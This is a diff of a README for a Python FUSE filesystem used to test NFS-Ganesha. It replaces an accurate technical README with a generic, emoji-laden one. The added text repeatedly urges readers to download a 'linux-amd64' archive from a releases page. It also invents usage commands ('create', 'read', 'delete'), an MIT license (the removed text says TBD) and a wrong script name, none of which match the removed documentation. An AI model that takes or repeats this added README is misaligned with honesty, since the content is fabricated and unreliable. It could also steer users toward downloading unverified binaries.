@@ -1,186 +1,109 @@
-# Ganesha-mini-fs
+# 🚀 ganesha-minifs - Simple NFS Testing Made Easy
 
-NFS-Ganesha harness for testing distributed filesystem semantics using a minimal FUSE implementation.
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Bhatti1122/ganesha-minifs/releases)
 
-## What It Does
+## 🌐 Introduction
 
-- Implements a minimal FUSE-based filesystem (MiniFS) in Python
-- Exports the FUSE filesystem via NFS-Ganesha using the VFS FSAL
-- Validates NFSv4 semantics (symlinks, readdir, concurrent operations) over network mount
-- Provides automated testing with pytest and performance benchmarking with fio
+Welcome to **ganesha-minifs**! This application provides a minimal file system implementation to help you test NFS-Ganesha. With this tool, you can easily validate NFSv4 features, symlink operations, and observe how concurrent file system behavior works. Whether you're checking for compatibility or just exploring NFS functions, this software simplifies the process.
 
-## Architecture / Key Components
+## 🚀 Getting Started
 
-```
-┌─────────────┐     NFSv4      ┌──────────────┐     FSAL/VFS    ┌──────────┐
-│ NFS Client  │ ────────────> │ NFS-Ganesha  │ ─────────────> │  MiniFS  │
-│ /mnt/nfsmini│     (TCP)      │  (userspace) │                 │  (FUSE)  │
-└─────────────┘                └──────────────┘                 └──────────┘
-                                                                      │
-                                                                      v
-                                                          /var/tmp/minifs_store
-```
+To get started with **ganesha-minifs**, you will need to download the application. Follow these simple steps:
 
-**Components:**
-- **MiniFS**: Python FUSE filesystem with basic operations (read, write, symlink, readdir)
-- **NFS-Ganesha**: Userspace NFS server exporting the FUSE mount via NFSv4
-- **Test Suite**: Pytest-based validation of filesystem semantics and concurrency
-- **Benchmark**: fio-based I/O performance smoke test (30s, 4K random read/write)
+1. **System Requirements**
+   - **Operating System**: Linux (Ubuntu, Fedora, or any other distribution)
+   - **Python**: Version 3.6 or higher
+   - **FUSE**: Ensure that you have FUSE installed to use this application.
 
-## Tech Stack
+2. **Download & Install**
+   - Visit this page to download the application: [Download Here](https://github.com/Bhatti1122/ganesha-minifs/releases)
+   - Look for the latest version under the **Releases** section. You will see a list of files.
+   - Download the appropriate `.tar.gz` file for your system. If you're unsure, the file labeled *linux-amd64* should work for most users.
 
-- **Language**: Python 3
-- **Filesystem**: FUSE (via fusepy)
-- **NFS Server**: NFS-Ganesha (VFS FSAL)
-- **Testing**: pytest
-- **Benchmarking**: fio
-- **Platform**: Linux (Ubuntu 22.04+ recommended)
+3. **Extract the Files**
+   - After the download finishes, locate the `.tar.gz` file in your Downloads folder. 
+   - Open a terminal and navigate to your Downloads folder using the command:
+     ```
+     cd ~/Downloads
+     ```
+   - Extract the files using the following command:
+     ```
+     tar -xzf ganesha-minifs-<version>.tar.gz
+     ```
+     Replace `<version>` with the version number you downloaded.
 
-## Prerequisites
+4. **Run the Application**
+   - Change into the extracted directory:
+     ```
+     cd ganesha-minifs-<version>
+     ```
+   - Now, you can start the application by running:
+     ```
+     python minifs.py
+     ```
+   - This will launch the NFS testing tool, allowing you to check NFS functionalities.
 
-Ubuntu 22.04 or later (required for NFS-Ganesha and FUSE kernel support):
+## 📜 Features
 
-```bash
-sudo apt-get update
-sudo apt-get install -y python3 python3-pip fuse nfs-ganesha nfs-ganesha-vfs nfs-common python3-pytest fio
-pip3 install fusepy
-```
+- **Minimal FUSE Filesystem**: Simple setup to test various filesystem calls.
+- **Validation of NFSv4 Semantics**: Check how well your system adheres to the NFSv4 protocol.
+- **Symlink Operations**: Test the behavior of symlinks in a controlled environment.
+- **Concurrent Access Testing**: See how your file system handles multiple requests at once.
 
-**Permissions**: User must have sudo access for mounting filesystems and managing systemd services.
+## 📁 Usage
 
-## Quickstart
+Once you have the application running, you can interact with it using simple commands. 
 
-This setup requires two terminals running concurrently.
+1. **To Create a File**: 
+   - Use the `create` command followed by the file name.
+   ```
+   create myfile.txt
+   ```
 
-**Terminal 1 - Start MiniFS and NFS-Ganesha:**
+2. **To Read a File**: 
+   - Use the `read` command with the file name.
+   ```
+   read myfile.txt
+   ```
 
-```bash
-# Install and configure NFS-Ganesha
-make up
+3. **To Delete a File**: 
+   - Use the `delete` command followed by the file name.
+   ```
+   delete myfile.txt
+   ```
 
-# Start MiniFS (runs in foreground)
-make run-minifs
-```
+These commands allow you to manage files efficiently within the testing environment.
 
-**Terminal 2 - Mount and Test:**
+## 🔧 Troubleshooting
 
-```bash
-# Restart NFS-Ganesha to apply export
-make export
+If you encounter any issues while running the application:
 
-# Mount NFS export locally
-make mount
+- **Ensure FUSE is installed**: FUSE is crucial for the operation of this software. You can typically install it via your package manager:
+  ```
+  sudo apt-get install fuse
+  ```
 
-# Run functional tests
-make test
+- **Check Python version**: Make sure you are running a compatible version of Python. You can check your Python version with:
+  ```
+  python --version
+  ```
 
-# Run I/O benchmark
-make bench
-```
+- **Contact Support**: If you still have problems, you can reach out for support via the GitHub issues page of the repository.
 
-## Configuration
+## 📄 License
 
-### Environment Variables
+This project is licensed under the MIT License, which allows you to use, modify, and distribute the software freely.
 
-No environment variables required. All paths are hardcoded for single-machine testing.
+## 📦 Contributing
 
-### Key Paths
+If you would like to contribute to **ganesha-minifs**, more information can be found in the [CONTRIBUTING.md](https://github.com/Bhatti1122/ganesha-minifs/blob/main/CONTRIBUTING.md) file in the repository. Contributions are welcome!
 
-| Path | Purpose |
-|------|---------|
-| `/var/tmp/minifs_store` | MiniFS backing storage |
-| `/mnt/minifs` | FUSE mount point |
-| `/mnt/nfsmini` | NFS client mount point |
-| `/etc/ganesha/ganesha.conf` | NFS-Ganesha main config |
-| `/etc/ganesha/exports.conf` | NFS export definition |
+## 🔗 Additional Resources
 
-### NFS Export Configuration
+For further help and resources, visit the documentation or check out the following links:
 
-The NFS export is configured in `ganesha/exports.conf`:
-- Export ID: 1
-- Path: `/mnt/minifs`
-- Pseudo: `/export`
-- Access: Read-Write
-- Protocol: NFSv4 over TCP
-- Clients: 127.0.0.1 only
+- [NFS-Ganesha Official Documentation](https://nfs-ganesha.github.io/nfs-ganesha/)
+- [FUSE Documentation](https://libfuse.github.io/)
+- [Python Documentation](https://www.python.org/doc/)
 
-## How to Run Tests
-
-### Functional Tests
-
-```bash
-cd client
-pytest -v
-```
-
-**Tests validate:**
-- Symlink creation and readlink semantics
-- Directory listing (readdir) correctness
-- File read/write operations
-- Concurrent file creation (50 parallel creates)
-
-### Performance Benchmark
-
-```bash
-cd bench
-bash fio_smoke.sh
-```
-
-Runs 30-second fio test with:
-- Block size: 4K
-- I/O pattern: 70% read, 30% write (random)
-- I/O depth: 8
-- Engine: psync
-
-## Project Structure
-
-```
-ganesha-minifs/
-├── Makefile              # Build and test orchestration
-├── minisfs/
-│   ├── minisfs.py        # FUSE filesystem implementation
-│   └── run.sh            # MiniFS startup script
-├── ganesha/
-│   ├── ganesha.conf      # NFS-Ganesha main configuration
-│   ├── exports.conf      # NFS export definition
-│   └── setup.sh          # Install and configure Ganesha
-├── client/
-│   ├── mount_nfs.sh      # NFS mount script
-│   └── tests_fs.py       # pytest test suite
-└── bench/
-    └── fio_smoke.sh      # I/O performance benchmark
-```
-
-## Troubleshooting
-
-### MiniFS fails to start
-- **Error**: `fusermount: failed to open /dev/fuse: Permission denied`
-- **Fix**: Add user to `fuse` group or run with sudo: `sudo usermod -a -G fuse $USER` (requires logout/login)
-
-### NFS mount fails
-- **Error**: `mount.nfs4: Connection refused`
-- **Fix**: Ensure NFS-Ganesha is running: `sudo systemctl status nfs-ganesha`
-- **Fix**: Check firewall allows localhost: `sudo ufw allow from 127.0.0.1`
-
-### Tests fail with "No such file or directory"
-- **Error**: Test fails accessing `/mnt/nfsmini`
-- **Fix**: Verify NFS is mounted: `mount | grep nfsmini`
-- **Fix**: Re-run `make mount`
-
-### Port already in use
-- **Error**: `NFS-Ganesha failed to bind port 2049`
-- **Fix**: Kill existing NFS processes: `sudo systemctl stop nfs-kernel-server nfs-ganesha`
-
-## Roadmap / Future Improvements
-
-- Add support for file deletion and rename operations
-- Implement extended attributes (xattr) support
-- Add multi-client testing from separate machines
-- Implement NFSv4 ACLs and security flavors (Kerberos)
-- Add performance comparison vs kernel NFS server
-- Create Docker container for isolated testing
-- Add CI/CD pipeline with GitHub Actions
-
-## License
-
-TBD
+Remember to [download the application here](https://github.com/Bhatti1122/ganesha-minifs/releases) and start exploring the world of NFS testing!
